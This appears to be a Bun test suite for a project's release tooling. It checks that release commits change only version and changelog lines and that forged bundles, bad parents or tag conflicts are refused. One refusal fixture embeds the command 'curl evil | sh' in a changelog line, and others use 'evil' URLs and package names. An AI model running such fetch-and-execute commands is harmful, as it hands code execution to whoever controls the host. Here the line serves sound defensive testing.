import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test"
import { execFileSync, spawnSync } from "node:child_process"
import { createHash } from "node:crypto"
import { chmod, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { body, changelog, check, lines, rule, shape } from "./release-check"
import { pack } from "./release-bundle"
import { push } from "./release-push"

// A throwaway "origin" stands in for GitHub: the release-commit side writes the bundle with pack(),
// the release-push side runs script/kilocode/release-push.ts (or push()) against the bare repository.

const roots: string[] = []
afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
})

async function temp() {
  const root = await mkdtemp(path.join(os.tmpdir(), "release-push-"))
  roots.push(root)
  return root
}

const saved = { ...process.env }
let tools = ""
beforeAll(async () => {
  tools = await mkdtemp(path.join(os.tmpdir(), "release-push-tools-"))
  const config = path.join(tools, "gitconfig")
  await writeFile(config, "[user]\n\tname = test\n\temail = test@example.com\n[init]\n\tdefaultBranch = main\n")
  Object.assign(process.env, { GIT_CONFIG_GLOBAL: config, GIT_CONFIG_NOSYSTEM: "1" })
})
afterAll(async () => {
  for (const key of Object.keys(process.env)) if (!(key in saved)) delete process.env[key]
  Object.assign(process.env, saved)
  await rm(tools, { recursive: true, force: true })
})

const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).trim()
const digest = async (file: string) =>
  createHash("sha256")
    .update(await readFile(file))
    .digest("hex")

const json = (name: string, version: string) =>
  `{\n  "name": "${name}",\n  "version": "${version}",\n  "private": true\n}\n`
const lock = (cli: string, pin: string, other = cli) =>
  [
    "{",
    '  "lockfileVersion": 1,',
    '  "workspaces": {',
    '    "packages/kilo-jetbrains": {',
    '      "name": "@kilocode/kilo-jetbrains",',
    `      "version": "${pin}",`,
    "    },",
    '    "packages/opencode": {',
    '      "name": "@kilocode/cli",',
    `      "version": "${cli}",`,
    "    },",
    '    "packages/other": {',
    '      "name": "@kilocode/other",',
    `      "version": "${other}",`,
    "    },",
    "  },",
    "}",
    "",
  ].join("\n")
const toml = (version: string) =>
  `id = "kilo"\nversion = "${version}"\n\n[targets]\narchive = "https://github.com/Kilo-Org/kilocode/releases/download/v${version}/kilo-linux-x64.tar.gz"\n`
const sha40 = "0123456789abcdef0123456789abcdef01234567"
const entry = `- [#12](https://github.com/Kilo-Org/kilocode/pull/12) [\`0123456\`](https://github.com/Kilo-Org/kilocode/commit/${sha40}) - A change`
const cli = (sections: string) => `# @kilocode/cli\n\n${sections}`
/** What the changelog lines may name: these packages and only the commit sha40 in the history. */
const known = { packages: new Set(["@kilocode/sdk"]), commit: (full: string) => full === sha40 }

/** Writes the release files of `version` the way the version bump and `changeset version` do. */
async function release(dir: string, version: string) {
  await writeFile(path.join(dir, "package.json"), json("kilo", version))
  await writeFile(path.join(dir, "packages/opencode/package.json"), json("@kilocode/cli", version))
  await writeFile(path.join(dir, "bun.lock"), lock(version, "0.9.0"))
  await writeFile(path.join(dir, "packages/extensions/zed/extension.toml"), toml(version))
  const file = path.join(dir, "packages/opencode/CHANGELOG.md")
  const old = await readFile(file, "utf8")
  // The commit link names a commit in the history, as changesets does (the commit that added the changeset).
  const head = git(dir, "rev-parse", "HEAD")
  const linked = entry.replace(sha40, head).replace("`0123456`", `\`${head.slice(0, 7)}\``)
  await writeFile(file, old.replace("\n\n", `\n\n## ${version}\n\n### Patch Changes\n\n${linked}\n\n`))
  await rm(path.join(dir, ".changeset/one.md"))
}

/** A bare origin whose main holds release 1.0.0, a clone of it, and that dispatch commit. */
type Fixture = { root: string; origin: string; work: string; base: string }

async function fixture(): Promise<Fixture> {
  const root = await temp()
  const origin = path.join(root, "origin.git")
  const work = path.join(root, "work")
  git(root, "init", "--bare", "--quiet", origin)
  git(origin, "config", "uploadpack.allowFilter", "true")
  git(origin, "config", "uploadpack.allowAnySHA1InWant", "true")
  git(root, "clone", "--quiet", origin, work)
  for (const dir of [
    "packages/opencode",
    "packages/kilo-jetbrains",
    "packages/extensions/zed",
    ".changeset",
    ".github/workflows",
    "script",
  ]) {
    await mkdir(path.join(work, dir), { recursive: true })
  }
  await writeFile(path.join(work, "package.json"), json("kilo", "1.0.0"))
  await writeFile(path.join(work, "packages/opencode/package.json"), json("@kilocode/cli", "1.0.0"))
  await writeFile(path.join(work, "packages/kilo-jetbrains/package.json"), json("@kilocode/kilo-jetbrains", "0.9.0"))
  await writeFile(path.join(work, "packages/opencode/CHANGELOG.md"), cli("## 1.0.0\n\n- First\n"))
  await writeFile(path.join(work, "bun.lock"), lock("1.0.0", "0.9.0"))
  await writeFile(path.join(work, "packages/extensions/zed/extension.toml"), toml("1.0.0"))
  await writeFile(path.join(work, ".changeset/one.md"), "---\n'@kilocode/cli': patch\n---\n\nA change\n")
  await writeFile(path.join(work, ".changeset/README.md"), "Changesets\n")
  await writeFile(path.join(work, ".github/workflows/ci.yml"), "on: push\n")
  await writeFile(path.join(work, "script/tool.ts"), "export {}\n")
  await writeFile(path.join(work, "README.md"), "Kilo\n")
  git(work, "add", "-A")
  git(work, "commit", "--quiet", "-m", "release: v1.0.0")
  git(work, "push", "--quiet", "origin", "HEAD:main")
  return { root, origin, work, base: git(work, "rev-parse", "HEAD") }
}

/** Packs the release commit the way the release-commit job does. */
async function packed(f: Fixture) {
  await release(f.work, "1.0.1")
  const out = path.join(f.root, "out")
  const result = await pack({ cwd: f.work, version: "1.0.1", out })
  return { ...result, bundle: path.join(out, "release.bundle") }
}

/** A bundle of tag v1.0.1 on a commit made by `edit`, without the checks pack() runs. */
async function forge(f: Fixture, edit: (dir: string) => Promise<void>, parents?: string[]) {
  await edit(f.work)
  git(f.work, "add", "-A")
  if (parents) {
    const tree = git(f.work, "write-tree")
    const commit = git(f.work, "commit-tree", tree, ...parents.flatMap((item) => ["-p", item]), "-m", "release: v1.0.1")
    git(f.work, "reset", "--quiet", "--hard", commit)
  } else git(f.work, "commit", "--quiet", "-m", "release: v1.0.1")
  git(f.work, "tag", "v1.0.1")
  const bundle = path.join(f.root, "forged.bundle")
  git(f.work, "bundle", "create", "--quiet", bundle, "refs/tags/v1.0.1", `^${f.base}`)
  return { bundle, sha256: await digest(bundle), commit: git(f.work, "rev-parse", "HEAD") }
}

/** A clone of origin at the dispatch commit: a plain clone, or the CI checkout shape. */
async function keys(f: Fixture, shape: "plain" | "ci" = "plain") {
  const dir = path.join(f.root, `keys-${Date.now()}-${Math.random()}`)
  if (shape === "ci") {
    git(f.root, "clone", "--quiet", "--depth=1", "--filter=blob:none", "--sparse", `file://${f.origin}`, dir)
  } else git(f.root, "clone", "--quiet", f.origin, dir)
  git(dir, "checkout", "--quiet", "--detach", f.base)
  return dir
}

/** The release-push job: the script in a fresh clone of origin at the dispatch commit. */
async function run(f: Fixture, bundle: string, sha256: string) {
  const cwd = await keys(f)
  const result = spawnSync("bun", [path.join(import.meta.dir, "release-push.ts"), bundle], {
    cwd,
    env: { ...process.env, BUNDLE_SHA256: sha256, VERSION: "1.0.1", BASE: f.base },
    encoding: "utf8",
  })
  return { code: result.status, output: `${result.stdout}${result.stderr}` }
}

/** Moves origin's main by one commit that writes `files`. */
async function move(f: Fixture, files: Record<string, string>) {
  const other = path.join(f.root, `other-${Date.now()}-${Math.random()}`)
  git(f.root, "clone", "--quiet", f.origin, other)
  for (const [name, text] of Object.entries(files)) {
    await mkdir(path.dirname(path.join(other, name)), { recursive: true })
    await writeFile(path.join(other, name), text)
  }
  git(other, "add", "-A")
  git(other, "commit", "--quiet", "-m", "unrelated change")
  git(other, "push", "--quiet", "origin", "HEAD:main")
  return git(other, "rev-parse", "HEAD")
}

const refs = (origin: string) => ({
  main: git(origin, "rev-parse", "main"),
  tag: spawnSync("git", ["rev-parse", "--verify", "--quiet", "refs/tags/v1.0.1"], {
    cwd: origin,
    encoding: "utf8",
  }).stdout.trim(),
})
const parents = (origin: string, ref: string) =>
  git(origin, "rev-list", "--parents", "-n", "1", ref).split(" ").slice(1)

describe("release-check", () => {
  test("rules: version and changelog paths only, and never the denied paths", () => {
    const kind = (file: string, status = "M") => {
      const found = rule(file, status)
      return "refused" in found ? "refused" : found.kind
    }
    expect(kind("package.json")).toBe("json")
    expect(kind("packages/sdk/js/package.json")).toBe("json")
    expect(kind("bun.lock")).toBe("json")
    expect(kind("packages/extensions/zed/extension.toml")).toBe("toml")
    expect(kind("packages/opencode/CHANGELOG.md")).toBe("changelog")
    expect(kind("packages/kilo-vscode/CHANGELOG.md")).toBe("changelog")
    expect(kind("packages/kilo-jetbrains/CHANGELOG.md")).toBe("changelog")
    expect(kind(".changeset/one.md", "D")).toBe("delete")
    for (const [file, status] of [
      [".github/workflows/publish.yml", "M"],
      [".github/package.json", "M"],
      ["script/upstream/package.json", "M"],
      ["bin/package.json", "M"],
      ["nix/package.json", "M"],
      ["packages/x/bun.lock", "M"],
      ["package-lock.json", "M"],
      ["packages/kilo-jetbrains/package.json", "M"],
      ["packages/new/package.json", "A"],
      ["packages/sdk/js/CHANGELOG.md", "M"],
      ["CHANGELOG.md", "M"],
      [".changeset/one.md", "M"],
      [".changeset/README.md", "D"],
      ["bun.lock", "D"],
      ["packages/opencode/src/index.ts", "M"],
    ]) {
      expect(kind(file!, status)).toBe("refused")
    }
  })

  test("lines: only version lines, from any version to the release version", () => {
    const old = json("a", "1.0.0")
    expect(lines("json", "p", old, json("a", "1.0.1"), "1.0.1")).toEqual([])
    expect(lines("json", "p", json("a", "0.1.0"), json("a", "1.0.1"), "1.0.1")).toEqual([])
    expect(lines("json", "p", old, json("a", "1.0.2"), "1.0.1")).toEqual(["p:3: the new line is not version 1.0.1"])
    expect(lines("json", "p", json("a", "latest"), json("a", "1.0.1"), "1.0.1")).toEqual([
      'p:3: only "version" lines may change',
    ])
    expect(lines("json", "p", old, old.replace('"private": true', '"private": false'), "1.0.1")).toEqual([
      'p:4: only "version" lines may change',
    ])
    expect(lines("json", "p", old, `${old}\n`, "1.0.1")).toEqual(["p: the line count changed"])
    expect(lines("toml", "t", toml("1.0.0"), toml("1.0.1"), "1.0.1")).toEqual([])
    expect(lines("toml", "t", toml("1.0.0"), toml("1.0.0").replace("kilo-linux-x64", "evil"), "1.0.1")).toEqual([
      "t:5: only the version line and release download URLs may change",
    ])
  })

  test("changelog: one prepended block of changesets output for deleted changesets", () => {
    const summaries = new Set(body("---\n'@kilocode/cli': patch\n---\n\nA change\n\nSecond paragraph\n"))
    // A changeset saved with a byte order mark (as .changeset/fix-windows-arm64-error.md was) and CRLF line ends.
    expect(body("\uFEFF---\r\n'@kilocode/cli': patch\r\n---\r\n\r\nA change  \r\n")).toEqual(["A change"])
    const old = cli("## 1.0.0\n\n- First\n")
    const block = `## 1.0.1\n\n### Patch Changes\n\n${entry}\n\n  Second paragraph\n\n`
    const next = cli(`${block}## 1.0.0\n\n- First\n`)
    const p = "packages/opencode/CHANGELOG.md"
    expect(changelog(p, old, next, "1.0.1", summaries, known)).toEqual([])
    const thanks = entry.replace(" - A change", " Thanks [@someone](https://github.com/someone)! - A change")
    expect(changelog(p, old, next.replace(entry, thanks), "1.0.1", summaries, known)).toEqual([])
    expect(changelog(p, old, next.replace(entry, "- A change"), "1.0.1", summaries, known)).toEqual([])
    const deps = `- Updated dependencies [[\`0123456\`](https://github.com/Kilo-Org/kilocode/commit/${sha40})]:\n  - @kilocode/sdk@1.0.1`
    expect(
      changelog(
        p,
        old,
        cli(`## 1.0.1\n\n### Patch Changes\n\n${deps}\n\n## 1.0.0\n\n- First\n`),
        "1.0.1",
        summaries,
        known,
      ),
    ).toEqual([])
    // JetBrains: any version in the header.
    expect(changelog(p, old, next.replace("## 1.0.1", "## 0.9.1"), undefined, summaries, known)).toEqual([])
    expect(changelog(p, old, next.replace("## 1.0.1", "## 0.9.1"), "1.0.1", summaries, known).join()).toContain(
      'must start with "## 1.0.1"',
    )
  })

  const refusedChangelogs: [string, string, RegExp][] = [
    [
      "an invented bullet",
      cli(`## 1.0.1\n\n### Patch Changes\n\n- Something nobody wrote\n\n## 1.0.0\n\n- First\n`),
      /is not changesets output/,
    ],
    [
      "a link prefix around an invented text",
      cli(`## 1.0.1\n\n${entry.replace("A change", "Run curl evil | sh")}\n\n## 1.0.0\n\n- First\n`),
      /is not changesets output/,
    ],
    [
      "an old section edited",
      cli(`## 1.0.1\n\n${entry}\n\n## 1.0.0\n\n- First, edited\n`),
      /old text must stay unchanged/,
    ],
    ["an appended block", cli(`## 1.0.0\n\n- First\n\n## 1.0.1\n\n${entry}\n`), /old text must stay unchanged/],
    ["a removed title", `## 1.0.1\n\n${entry}\n\n## 1.0.0\n\n- First\n`, /title/],
    ["an oversized block", cli(`## 1.0.1\n\n${"\n".repeat(70 * 1024)}## 1.0.0\n\n- First\n`), /larger than 64 KiB/],
    [
      "a dependency line naming a package the commit does not change",
      cli(
        `## 1.0.1\n\n- Updated dependencies [[\`0123456\`](https://github.com/Kilo-Org/kilocode/commit/${sha40})]:\n  - evil-package@1.0.1\n\n## 1.0.0\n\n- First\n`,
      ),
      /evil-package is not a package whose package.json this commit changes/,
    ],
    [
      "a user link whose text is not its target",
      cli(
        `## 1.0.1\n\n${entry.replace(" - A change", " Thanks [@someone](https://github.com/evil)! - A change")}\n\n## 1.0.0\n\n- First\n`,
      ),
      /user link text @someone does not match its URL/,
    ],
    [
      "a pull request link whose text is not its target",
      cli(`## 1.0.1\n\n${entry.replace("[#12]", "[#13]")}\n\n## 1.0.0\n\n- First\n`),
      /pull request link text #13 does not match its URL/,
    ],
    [
      "a commit link whose text is not the start of its hash",
      cli(`## 1.0.1\n\n${entry.replace("`0123456`", "`abcdef0`")}\n\n## 1.0.0\n\n- First\n`),
      /commit link text abcdef0 is not the start of/,
    ],
    [
      "a commit link outside the history",
      cli(
        `## 1.0.1\n\n${entry.replaceAll(sha40, `fedcba9${"0".repeat(33)}`).replace("`0123456`", "`fedcba9`")}\n\n## 1.0.0\n\n- First\n`,
      ),
      /is not in the history of the dispatch commit/,
    ],
    [
      "a dependency update commit outside the history",
      cli(
        `## 1.0.1\n\n- Updated dependencies [[\`fedcba9\`](https://github.com/Kilo-Org/kilocode/commit/fedcba9${"0".repeat(33)})]:\n  - @kilocode/sdk@1.0.1\n\n## 1.0.0\n\n- First\n`,
      ),
      /is not in the history of the dispatch commit/,
    ],
  ]
  for (const [name, next, problem] of refusedChangelogs) {
    test(`changelog: refuses ${name}`, () => {
      const summaries = new Set(["A change"])
      expect(changelog("c", cli("## 1.0.0\n\n- First\n"), next, "1.0.1", summaries, known).join("\n")).toMatch(problem)
      expect(changelog("c", cli("## 1.0.0\n\n- First\n"), next, undefined, summaries, known).join("\n")).toMatch(
        problem,
      )
    })
  }

  test("a release commit made like the version bump passes", async () => {
    const f = await fixture()
    const result = await packed(f)
    expect(check({ cwd: f.work, from: f.base, to: result.commit, version: "1.0.1" })).toEqual([])
    expect(shape({ cwd: f.work, commit: result.commit, parents: [f.base], subject: "release: v1.0.1" })).toEqual([])
    const manifest = JSON.parse(await readFile(path.join(f.root, "out/release-manifest.json"), "utf8"))
    expect(manifest.paths.map((item: { path: string }) => item.path).sort()).toEqual([
      ".changeset/one.md",
      "bun.lock",
      "package.json",
      "packages/extensions/zed/extension.toml",
      "packages/opencode/CHANGELOG.md",
      "packages/opencode/package.json",
    ])
  })

  test("a workspace package at an older version moves to the release version", async () => {
    const f = await fixture()
    await writeFile(path.join(f.work, "bun.lock"), lock("1.0.0", "0.9.0", "0.3.2"))
    git(f.work, "commit", "--quiet", "-am", "older workspace package")
    const base = git(f.work, "rev-parse", "HEAD")
    await release(f.work, "1.0.1")
    await writeFile(path.join(f.work, "bun.lock"), lock("1.0.1", "0.9.0", "1.0.1"))
    const result = await pack({ cwd: f.work, version: "1.0.1", out: path.join(f.root, "out") })
    expect(check({ cwd: f.work, from: base, to: result.commit, version: "1.0.1" })).toEqual([])
  })

  test("a package.json that is executable on main may change while it keeps its mode", async () => {
    const f = await fixture()
    await chmod(path.join(f.work, "packages/opencode/package.json"), 0o755)
    git(f.work, "add", "-A")
    git(f.work, "commit", "--quiet", "-m", "executable package.json")
    const base = git(f.work, "rev-parse", "HEAD")
    await release(f.work, "1.0.1")
    const result = await pack({ cwd: f.work, version: "1.0.1", out: path.join(f.root, "out") })
    expect(check({ cwd: f.work, from: base, to: result.commit, version: "1.0.1" })).toEqual([])
  })

  test("pack leaves out a change the release commit may not carry", async () => {
    const f = await fixture()
    await writeFile(path.join(f.work, "script/tool.ts"), "export const drift = 1\n")
    await writeFile(path.join(f.work, "new.txt"), "untracked\n")
    const result = await packed(f)
    expect(git(f.work, "show", `${result.commit}:script/tool.ts`)).toBe("export {}")
    expect(spawnSync("git", ["cat-file", "-e", `${result.commit}:new.txt`], { cwd: f.work }).status).not.toBe(0)
  })

  test("pack names bun.lock as the cause when it changes beyond version lines", async () => {
    const f = await fixture()
    await release(f.work, "1.0.1")
    await writeFile(
      path.join(f.work, "bun.lock"),
      lock("1.0.1", "0.9.0").replace('"lockfileVersion": 1', '"lockfileVersion": 2'),
    )
    const error = await pack({ cwd: f.work, version: "1.0.1", out: path.join(f.root, "out") }).then(
      () => undefined,
      (err: unknown) => err,
    )
    expect(String(error)).toContain("bun.lock on main is not in Bun's canonical form")
  })

  const deny: [string, (dir: string) => Promise<void>, RegExp][] = [
    [
      "a .github edit",
      (dir) => writeFile(path.join(dir, ".github/workflows/ci.yml"), "on: workflow_dispatch\n"),
      /\.github\/workflows\/ci\.yml \(M\): path is never part of a release commit/,
    ],
    [
      "a script edit",
      (dir) => writeFile(path.join(dir, "script/tool.ts"), "process.exit(1)\n"),
      /script\/tool\.ts \(M\)/,
    ],
    [
      "a mode change",
      (dir) => chmod(path.join(dir, "packages/opencode/package.json"), 0o755),
      /packages\/opencode\/package\.json: mode 100644 -> 100755/,
    ],
    [
      "a symlink",
      async (dir) => {
        await rm(path.join(dir, "packages/opencode/CHANGELOG.md"))
        await symlink("../../README.md", path.join(dir, "packages/opencode/CHANGELOG.md"))
      },
      /packages\/opencode\/CHANGELOG\.md: mode 100644 -> 120000/,
    ],
    [
      "a package.json change beyond its version",
      (dir) =>
        writeFile(path.join(dir, "package.json"), json("kilo", "1.0.1").replace('"private": true', '"private": false')),
      /package\.json:4: only "version" lines may change/,
    ],
    ["an added file", (dir) => writeFile(path.join(dir, "packages/opencode/new.md"), "x\n"), /new\.md \(A\)/],
    [
      "an invented changelog bullet",
      async (dir) => {
        const file = path.join(dir, "packages/opencode/CHANGELOG.md")
        await writeFile(file, (await readFile(file, "utf8")).replace(/^- \[#12\].* - A change$/m, "- Invented"))
      },
      /is not changesets output/,
    ],
    [
      "an old changelog section edited",
      async (dir) => {
        const file = path.join(dir, "packages/opencode/CHANGELOG.md")
        await writeFile(file, (await readFile(file, "utf8")).replace("- First", "- First, edited"))
      },
      /old text must stay unchanged/,
    ],
    [
      "a JetBrains changelog edited outside a prepended block",
      async (dir) => {
        await writeFile(path.join(dir, "packages/kilo-jetbrains/CHANGELOG.md"), "# Changelog\n\n## 0.9.0\n\n- Edited\n")
      },
      /packages\/kilo-jetbrains\/CHANGELOG\.md: the old text must stay unchanged/,
    ],
  ]
  for (const [name, edit, problem] of deny) {
    test(`refuses ${name}`, async () => {
      const f = await fixture()
      await writeFile(path.join(f.work, "packages/kilo-jetbrains/CHANGELOG.md"), "# Changelog\n\n## 0.9.0\n\n- Pin\n")
      git(f.work, "add", "-A")
      git(f.work, "commit", "--quiet", "-m", "JetBrains changelog")
      const base = git(f.work, "rev-parse", "HEAD")
      await release(f.work, "1.0.1")
      await edit(f.work)
      git(f.work, "add", "-A")
      git(f.work, "commit", "--quiet", "-m", "release: v1.0.1")
      const problems = check({ cwd: f.work, from: base, to: "HEAD", version: "1.0.1" })
      expect(problems.join("\n")).toMatch(problem)
    })
  }

  test("refuses an extra parent", async () => {
    const f = await fixture()
    const side = await move(f, { "README.md": "Side\n" })
    git(f.work, "fetch", "--quiet", "origin")
    const forged = await forge(f, (dir) => release(dir, "1.0.1"), [f.base, side])
    expect(shape({ cwd: f.work, commit: forged.commit, parents: [f.base], subject: "release: v1.0.1" })).toEqual([
      `commit ${forged.commit} has parents [${f.base}, ${side}], expected [${f.base}]`,
    ])
  })
})

describe("release-push", () => {
  test("writes the release commit from the checked tree, pushes it, and a re-run pushes nothing", async () => {
    const f = await fixture()
    const result = await packed(f)
    const first = await run(f, result.bundle, result.sha256)
    expect(first.code).toBe(0)
    const after = refs(f.origin)
    expect(after.main).toBe(after.tag)
    expect(first.output).toContain(`Pushed main ${after.tag} and tag v1.0.1`)
    expect(git(f.origin, "rev-parse", "v1.0.1^{tree}")).toBe(git(f.work, "rev-parse", `${result.commit}^{tree}`))
    expect(parents(f.origin, "v1.0.1")).toEqual([f.base])
    expect(git(f.origin, "log", "-1", "--format=%s|%an|%ae|%cn|%ct", "v1.0.1")).toBe(
      `release: v1.0.1|kilo-maintainer[bot]|kilo-maintainer[bot]@users.noreply.github.com|kilo-maintainer[bot]|${git(f.work, "log", "-1", "--format=%ct", result.commit)}`,
    )
    const again = await run(f, result.bundle, result.sha256)
    expect(again.code).toBe(0)
    expect(again.output).toContain("already names the release commit")
    expect(refs(f.origin)).toEqual(after)
  })

  test("refuses a tag on origin that names another commit", async () => {
    const f = await fixture()
    const result = await packed(f)
    git(f.work, "push", "--quiet", "origin", `${f.base}:refs/tags/v1.0.1`)
    const outcome = await run(f, result.bundle, result.sha256)
    expect(outcome.code).not.toBe(0)
    expect(outcome.output).toContain(`Tag v1.0.1 on origin names ${f.base}, not the release commit`)
    expect(refs(f.origin)).toEqual({ main: f.base, tag: f.base })
  })

  const refused: [string, (f: Fixture) => Promise<{ bundle: string; sha256: string }>, string][] = [
    [
      "a path outside the allowlist",
      (f) =>
        forge(f, async (dir) => {
          await release(dir, "1.0.1")
          await writeFile(path.join(dir, ".github/workflows/ci.yml"), "on: workflow_dispatch\n")
        }),
      "path is never part of a release commit",
    ],
    [
      "a wrong parent",
      async (f) => {
        const side = await move(f, { "README.md": "Side\n" })
        git(f.work, "fetch", "--quiet", "origin")
        git(f.work, "reset", "--quiet", "--hard", side)
        return forge(f, (dir) => release(dir, "1.0.1"))
      },
      "expected [",
    ],
    [
      "an extra parent",
      async (f) => {
        const side = await move(f, { "README.md": "Side\n" })
        git(f.work, "fetch", "--quiet", "origin")
        return forge(f, (dir) => release(dir, "1.0.1"), [f.base, side])
      },
      "has parents [",
    ],
    [
      "a hash mismatch",
      async (f) => {
        const forged = await forge(f, (dir) => release(dir, "1.0.1"))
        return { bundle: forged.bundle, sha256: "0".repeat(64) }
      },
      "the release-commit job recorded",
    ],
    [
      "a tag object instead of a commit",
      async (f) => {
        await release(f.work, "1.0.1")
        git(f.work, "add", "-A")
        git(f.work, "commit", "--quiet", "-m", "release: v1.0.1")
        git(f.work, "tag", "-a", "-m", "tag", "v1.0.1")
        const bundle = path.join(f.root, "annotated.bundle")
        git(f.work, "bundle", "create", "--quiet", bundle, "refs/tags/v1.0.1", `^${f.base}`)
        return { bundle, sha256: await digest(bundle) }
      },
      "is a tag, not a commit",
    ],
  ]
  for (const [name, make, message] of refused) {
    test(`refuses ${name} and pushes nothing`, async () => {
      const f = await fixture()
      const { bundle, sha256 } = await make(f)
      const before = refs(f.origin)
      const result = await run(f, bundle, sha256)
      expect(result.code).not.toBe(0)
      expect(result.output).toContain(message)
      expect(result.output).toContain("Nothing was pushed")
      expect(refs(f.origin)).toEqual(before)
    })
  }

  test("merges when main moved without overlap; the tag stays on the release commit", async () => {
    const f = await fixture()
    const result = await packed(f)
    const head = await move(f, { "docs/new.md": "New\n" })
    const outcome = await run(f, result.bundle, result.sha256)
    expect(outcome.code).toBe(0)
    const after = refs(f.origin)
    expect(parents(f.origin, "v1.0.1")).toEqual([f.base])
    expect(parents(f.origin, "main")).toEqual([head, after.tag])
    expect(git(f.origin, "show", "main:docs/new.md")).toBe("New")
    expect(git(f.origin, "show", "main:packages/opencode/package.json")).toContain('"version": "1.0.1"')
  })

  test("merges when main changed .github; the second check stays clean", async () => {
    const f = await fixture()
    const result = await packed(f)
    const head = await move(f, { ".github/workflows/ci.yml": "on: pull_request\n" })
    const outcome = await run(f, result.bundle, result.sha256)
    expect(outcome.code).toBe(0)
    expect(git(f.origin, "show", "main:.github/workflows/ci.yml")).toBe("on: pull_request")
    expect(git(f.origin, "diff", "--name-only", head, "main").split("\n").sort()).toEqual([
      ".changeset/one.md",
      "bun.lock",
      "package.json",
      "packages/extensions/zed/extension.toml",
      "packages/opencode/CHANGELOG.md",
      "packages/opencode/package.json",
    ])
  })

  test("refuses a conflict with main and pushes nothing", async () => {
    const f = await fixture()
    const result = await packed(f)
    const head = await move(f, { "packages/opencode/package.json": json("@kilocode/cli", "1.0.0-hotfix") })
    const outcome = await run(f, result.bundle, result.sha256)
    expect(outcome.code).not.toBe(0)
    expect(outcome.output).toContain("conflicts with main")
    expect(refs(f.origin)).toEqual({ main: head, tag: "" })
  })

  for (const shape of ["plain", "ci"] as const) {
    test(`${shape} checkout: merges again when main moves during the push (lease race)`, async () => {
      const f = await fixture()
      const result = await packed(f)
      const cwd = await keys(f, shape)
      const head = await move(f, { "docs/before.md": "Before\n" })
      let moved = ""
      const outcome = await push({
        cwd,
        bundle: result.bundle,
        sha256: result.sha256,
        version: "1.0.1",
        base: f.base,
        before: async (attempt) => {
          if (attempt === 0) moved = await move(f, { "docs/race.md": "Race\n" })
        },
      })
      expect(outcome.skipped).toBe(false)
      expect(head).not.toBe(moved)
      expect(parents(f.origin, "main")).toEqual([moved, refs(f.origin).tag])
      expect(git(f.origin, "show", "main:docs/before.md")).toBe("Before")
      expect(parents(f.origin, "v1.0.1")).toEqual([f.base])
    })
  }

  test("ci checkout: fast-forwards when main did not move", async () => {
    const f = await fixture()
    const result = await packed(f)
    const outcome = await push({
      cwd: await keys(f, "ci"),
      bundle: result.bundle,
      sha256: result.sha256,
      version: "1.0.1",
      base: f.base,
    })
    expect(refs(f.origin)).toEqual({ main: outcome.commit, tag: outcome.commit })
  })

  test("refuses after two more merges when main keeps moving", async () => {
    const f = await fixture()
    const result = await packed(f)
    let count = 0
    let last = ""
    const error = await push({
      cwd: await keys(f),
      bundle: result.bundle,
      sha256: result.sha256,
      version: "1.0.1",
      base: f.base,
      before: async () => {
        count++
        last = await move(f, { [`docs/race-${count}.md`]: `${count}\n` })
      },
    }).then(
      () => undefined,
      (err: unknown) => err,
    )
    expect(String(error)).toContain("main kept moving")
    expect(count).toBe(3)
    expect(refs(f.origin)).toEqual({ main: last, tag: "" })
  })

  test("pushes the same refs again when a push fails with main unchanged", async () => {
    const f = await fixture()
    const result = await packed(f)
    const mark = path.join(f.root, "fail-once")
    await writeFile(mark, "")
    const hook = path.join(f.origin, "hooks", "pre-receive")
    await writeFile(hook, `#!/bin/sh\nif [ -f '${mark}' ]; then rm -f '${mark}'; echo refused once >&2; exit 1; fi\n`)
    await chmod(hook, 0o755)
    let attempts = 0
    const outcome = await push({
      cwd: await keys(f),
      bundle: result.bundle,
      sha256: result.sha256,
      version: "1.0.1",
      base: f.base,
      wait: 0,
      before: async () => {
        attempts++
      },
    })
    expect(attempts).toBe(2)
    expect(refs(f.origin)).toEqual({ main: outcome.commit, tag: outcome.commit })
  })

  test("counts a push as done when the refs are already where it was pushing them", async () => {
    const f = await fixture()
    const result = await packed(f)
    const cwd = await keys(f)
    const outcome = await push({
      cwd,
      bundle: result.bundle,
      sha256: result.sha256,
      version: "1.0.1",
      base: f.base,
      before: async (attempt, state) => {
        // The refs land, but the reply is lost: this push sees a moved main and an existing tag.
        if (attempt === 0)
          git(cwd, "push", "--quiet", "origin", `${state.target}:refs/heads/main`, `${state.commit}:refs/tags/v1.0.1`)
      },
    })
    expect(outcome.skipped).toBe(false)
    expect(refs(f.origin)).toEqual({ main: outcome.commit, tag: outcome.commit })
  })
})
